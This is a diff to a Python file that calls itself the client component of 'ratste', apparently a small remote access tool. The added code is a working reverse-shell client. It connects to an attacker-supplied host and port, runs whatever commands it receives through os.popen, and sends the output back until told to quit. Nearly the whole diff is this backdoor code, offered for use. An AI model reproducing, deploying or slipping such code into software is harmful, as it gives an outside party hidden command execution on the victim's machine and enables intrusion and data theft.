@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+
 """ 
 ratste's client component.
 
@@ -22,3 +23,32 @@ __date__ = "2021/05/25"
 __deprecated__ = False
 __license__ = "GPLv3"
 __version__ = "1.0.0"
+
+import os
+import socket
+import sys
+
+try:
+    RHOST = str(sys.argv[1])
+    RPORT = int(sys.argv[2])
+except:
+    sys.exit(1)
+
+def main():
+    s = socket.socket()
+    s.connect((RHOST, RPORT))
+
+    while True:
+        data = s.recv(1024)
+        cmd = data
+
+        # stop client
+        if cmd == 'quit':
+            s.close()
+            sys.exit(0)
+
+        results = os.popen(cmd).read()
+        s.sendall(results)
+
+if __name__ == '__main__':
+    main()
